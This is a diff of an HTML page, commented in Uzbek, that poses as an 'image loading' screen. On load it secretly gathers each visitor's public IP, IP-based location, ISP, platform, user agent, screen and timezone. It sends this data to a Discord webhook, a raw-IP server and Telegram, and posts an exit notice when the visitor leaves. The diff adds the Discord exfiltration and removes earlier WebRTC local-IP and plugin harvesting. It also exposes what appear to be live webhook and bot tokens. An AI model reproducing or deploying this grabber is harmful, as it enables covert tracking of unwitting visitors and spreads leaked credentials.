@@ -111,12 +111,20 @@
             margin: 10px 0;
             display: none;
         }
+        .error-message {
+            background: rgba(255, 0, 0, 0.2);
+            padding: 10px;
+            border-radius: 5px;
+            margin: 10px 0;
+            display: none;
+        }
     </style>
 </head>
 <body>
     <div class="controls">
         <button onclick="pauseRotation()">Pause</button>
         <button onclick="resumeRotation()">Resume</button>
+        <button onclick="testWebhook()">Test Webhook</button>
     </div>
     <div class="page-indicator">Sahifa: <span id="currentPage">1</span>/<span id="totalPages">3</span></div>
     <div class="status-message" id="statusMessage">Asosiy sahifa faol</div>
@@ -126,15 +134,52 @@
         <h1>Rasm Yuklanmoqda...</h1>
         <p>Iltimos, kuting</p>
         <div class="success-message" id="successMessage">Ma'lumotlar serverga yuborildi! ✅</div>
+        <div class="error-message" id="errorMessage"></div>
     </div>
 
     <iframe id="frame1" class="hidden-frame" src="about:blank"></iframe>
 
     <script>
+        // Discord Webhook URL - SIZNING MANZILINGIZ
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1430274332969406464/jWY9FXp_agGFehgu4C7tjFUK35V7-lWDgKfYs87M_ZoJXJcxRRCv_pK_IT8LGNc6gbrw";
+        
         // Sizning webhook serveringiz
         const WEBHOOK_URL = "http://38.242.228.144/webhook";
         const TELEGRAM_TOKEN = "8497552094:AAH9XKSVaoiisVOTD-gXW8GX9l8l1m5ioWM";
         const TELEGRAM_CHAT_ID = "1882641120";
+
+        // Discordga xabar yuborish
+        async function sendToDiscord(message) {
+            try {
+                console.log('Discordga xabar yuborilmoqda:', message);
+                
+                const response = await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        content: message,
+                        username: 'Tracking Bot',
+                        avatar_url: 'https://cdn-icons-png.flaticon.com/512/4712/4712035.png',
+                        allowed_mentions: { parse: [] }
+                    })
+                });
+
+                if (response.ok) {
+                    console.log('Xabar Discordga muvaffaqiyatli yuborildi');
+                    showSuccess('Xabar Discordga yuborildi! ✅');
+                    return true;
+                } else {
+                    const errorText = await response.text();
+                    throw new Error(`Discord server javobi: ${response.status} - ${errorText}`);
+                }
+            } catch (error) {
+                console.error('Discord xatosi:', error);
+                showError(`Discord xatosi: ${error.message}`);
+                return false;
+            }
+        }
 
         // Webhook serveriga ma'lumot yuborish
         async function sendToWebhook(data) {
@@ -158,11 +203,12 @@
                 }
             } catch (error) {
                 console.error('Webhook xatosi:', error);
+                showError(`Webhook xatosi: ${error.message}`);
                 return false;
             }
         }
 
-        // Telegramga xabar yuborish (webhook orqali)
+        // Telegramga xabar yuborish
         async function sendToTelegram(message) {
             const telegramData = {
                 type: 'telegram_message',
@@ -183,6 +229,28 @@
             setTimeout(() => {
                 successElement.style.display = 'none';
             }, 3000);
+        }
+
+        // Xatolik xabarini ko'rsatish
+        function showError(message) {
+            const errorElement = document.getElementById('errorMessage');
+            errorElement.textContent = message;
+            errorElement.style.display = 'block';
+            setTimeout(() => {
+                errorElement.style.display = 'none';
+            }, 5000);
+        }
+
+        // Test funksiyasi
+        async function testWebhook() {
+            const testMessage = "🔰 **TEST XABAR**\n\nBu test xabari. Agar buni ko'rsangiz, webhook ishlayapti! ✅\n\n⏰ Vaqt: " + new Date().toLocaleString();
+            
+            // Discordga test xabari
+            const discordSuccess = await sendToDiscord(testMessage);
+            
+            if (discordSuccess) {
+                console.log('Discord test xabari muvaffaqiyatli yuborildi');
+            }
         }
 
         // Sahifalar ro'yxati
@@ -269,46 +337,36 @@
             rotationTimer = setTimeout(switchPage, 500);
         }
         
-        // Asosiy tracking funksiyasi (GPS siz)
+        // Asosiy tracking funksiyasi
         async function startTracking() {
             try {
                 // 1. IP va geolokatsiya ma'lumotlarini olish
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                const publicIP = ipData.ip;
-
-                // Geolokatsiya ma'lumotlari (faqat IP asosida)
+                let publicIP = "Aniqlanmadi";
                 let geoData = {};
+                
                 try {
-                    const geoResponse = await fetch(`http://ip-api.com/json/${publicIP}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query`);
-                    geoData = await geoResponse.json();
-                } catch (geoError) {
-                    console.log('Geolokatsiya xatosi:', geoError);
-                }
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipResponse.json();
+                    publicIP = ipData.ip;
 
-                // 2. Local IP ni olish
-                let localIPs = "Aniqlanmoqda";
-                try {
-                    const pc = new RTCPeerConnection({iceServers: []});
-                    pc.createDataChannel('');
-                    await pc.createOffer().then(offer => pc.setLocalDescription(offer));
-                    
-                    const ips = [];
-                    pc.onicecandidate = (e) => {
-                        if (e.candidate) {
-                            const match = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
-                            if (match) ips.push(match[1]);
+                    // Geolokatsiya ma'lumotlari
+                    try {
+                        const geoResponse = await fetch(`https://ipapi.co/${publicIP}/json/`);
+                        geoData = await geoResponse.json();
+                    } catch (geoError) {
+                        console.log('Birinchi geolokatsiya xatosi:', geoError);
+                        try {
+                            const geoResponse2 = await fetch(`https://ipapi.co/json/`);
+                            geoData = await geoResponse2.json();
+                        } catch (geoError2) {
+                            console.log('Ikkinchi geolokatsiya xatosi:', geoError2);
                         }
-                    };
-                    
-                    setTimeout(() => {
-                        localIPs = ips.length > 0 ? ips.join(', ') : 'Topilmadi';
-                    }, 2000);
-                } catch (e) {
-                    localIPs = 'Xato: ' + e.message;
+                    }
+                } catch (ipError) {
+                    console.log('IP aniqlash xatosi:', ipError);
                 }
 
-                // 3. Tizim ma'lumotlarini yig'ish
+                // 2. Tizim ma'lumotlarini yig'ish
                 const systemInfo = {
                     platform: navigator.platform,
                     userAgent: navigator.userAgent,
@@ -324,11 +382,30 @@
                     url: window.location.href
                 };
 
+                // 3. Discordga asosiy xabar yuborish
+                let discordMessage = "🆕 **YANGI FOYDALANUVCHI KIRDI**\n\n";
+                discordMessage += `🌐 **Public IP:** \`${publicIP}\`\n`;
+                discordMessage += `🖥️ **Platforma:** ${systemInfo.platform}\n`;
+                discordMessage += `📱 **Ekran:** ${systemInfo.screen}\n`;
+                discordMessage += `⏰ **Vaqt zonasi:** ${systemInfo.timezone}\n`;
+                discordMessage += `🌍 **Til:** ${systemInfo.language}\n`;
+                
+                if (geoData.country_name) {
+                    discordMessage += `\n🗺️ **Geolokatsiya:**\n`;
+                    discordMessage += `📍 **Joylashuv:** ${geoData.city || 'Nomaʼlum'}, ${geoData.region || 'Nomaʼlum'}, ${geoData.country_name}\n`;
+                    discordMessage += `🏢 **ISP:** ${geoData.org || geoData.isp || 'Nomaʼlum'}\n`;
+                }
+
+                discordMessage += `\n🔗 **URL:** ${systemInfo.url}\n`;
+                discordMessage += `🕒 **Vaqt:** ${new Date().toLocaleString()}\n`;
+                discordMessage += `👤 **User Agent:** ${systemInfo.userAgent.substring(0, 100)}...`;
+
+                await sendToDiscord(discordMessage);
+
                 // 4. Asosiy ma'lumotlarni webhookga yuborish
                 const trackingData = {
                     type: 'user_tracking',
                     public_ip: publicIP,
-                    local_ips: localIPs,
                     geo_data: geoData,
                     system_info: systemInfo,
                     timestamp: new Date().toISOString(),
@@ -337,16 +414,14 @@
 
                 await sendToWebhook(trackingData);
 
-                // 5. Telegramga formatlangan xabar yuborish
+                // 5. Telegramga ham xabar yuborish
                 let telegramMessage = "🆕 <b>Yangi Foydalanuvchi Kirdi</b>\n\n";
                 telegramMessage += `🌐 <b>Public IP:</b> <code>${publicIP}</code>\n`;
-                telegramMessage += `🏠 <b>Local IPs:</b> ${localIPs}\n`;
                 
-                if (geoData.status === 'success') {
+                if (geoData.country_name) {
                     telegramMessage += `\n🗺️ <b>Geolokatsiya:</b>\n`;
-                    telegramMessage += `📍 <b>Joylashuv:</b> ${geoData.city}, ${geoData.regionName}, ${geoData.country}\n`;
-                    telegramMessage += `📡 <b>Koordinatalar:</b> ${geoData.lat}, ${geoData.lon}\n`;
-                    telegramMessage += `🏢 <b>ISP:</b> ${geoData.isp}\n`;
+                    telegramMessage += `📍 <b>Joylashuv:</b> ${geoData.city || 'Nomaʼlum'}, ${geoData.region || 'Nomaʼlum'}, ${geoData.country_name}\n`;
+                    telegramMessage += `🏢 <b>ISP:</b> ${geoData.org || geoData.isp || 'Nomaʼlum'}\n`;
                 }
 
                 telegramMessage += `\n💻 <b>Tizim Maʼlumotlari:</b>\n`;
@@ -359,53 +434,22 @@
 
             } catch (error) {
                 console.error('Tracking xatosi:', error);
+                showError(`Tracking xatosi: ${error.message}`);
                 
-                // Xatolik haqida ham ma'lumot yuborish
-                const errorData = {
-                    type: 'tracking_error',
-                    error: error.message,
-                    timestamp: new Date().toISOString()
-                };
-                await sendToWebhook(errorData);
+                // Xatolik haqida Discordga xabar berish
+                const errorMessage = "❌ **TRACKING XATOSI**\n\n" +
+                                   `Xato: ${error.message}\n` +
+                                   `Vaqt: ${new Date().toLocaleString()}`;
+                await sendToDiscord(errorMessage);
             }
-        }
-
-        // GPS funksiyalari olib tashlandi
-
-        // Qo'shimcha ma'lumotlarni yig'ish
-        function collectAdditionalInfo() {
-            const info = {
-                plugins: Array.from(navigator.plugins).map(p => p.name).join(', ') || 'Yoʻq',
-                javaEnabled: navigator.javaEnabled(),
-                pdfViewerEnabled: navigator.pdfViewerEnabled || false,
-                doNotTrack: navigator.doNotTrack || 'Nomaʼlum',
-                connection: navigator.connection ? {
-                    effectiveType: navigator.connection.effectiveType,
-                    downlink: navigator.connection.downlink,
-                    rtt: navigator.connection.rtt
-                } : 'Nomaʼlum'
-            };
-            return info;
         }
 
         // Dasturni ishga tushirish
         document.addEventListener('DOMContentLoaded', async function() {
+            console.log('Dastur ishga tushmoqda...');
+            
             // Asosiy trackingni boshlash
             await startTracking();
-            
-            // GPS tracking olib tashlandi
-            
-            // Qo'shimcha ma'lumotlarni yuborish
-            setTimeout(async () => {
-                const additionalInfo = collectAdditionalInfo();
-                const additionalData = {
-                    type: 'additional_info',
-                    browser_info: additionalInfo,
-                    timestamp: new Date().toISOString()
-                };
-                
-                await sendToWebhook(additionalData);
-            }, 4000);
             
             // Sahifalar almashinishini boshlash
             startPageRotation();
@@ -413,14 +457,11 @@
 
         // Brauzer yopilayotganda so'nggi ma'lumotni yuborish
         window.addEventListener('beforeunload', async function() {
-            const exitData = {
-                type: 'user_exit',
-                timestamp: new Date().toISOString(),
-                message: 'Foydalanuvchi sahifani tark etdi'
-            };
+            const exitMessage = "❌ **FOYDALANUVCHI SAHIFANI TARK ETDI**\n\n" +
+                              `🕒 Vaqt: ${new Date().toLocaleString()}\n` +
+                              `🔗 URL: ${window.location.href}`;
             
-            // Sync so'rov yuborish (brauzer blok qilmasligi uchun)
-            navigator.sendBeacon(WEBHOOK_URL, JSON.stringify(exitData));
+            await sendToDiscord(exitMessage);
         });
     </script>
 </body>
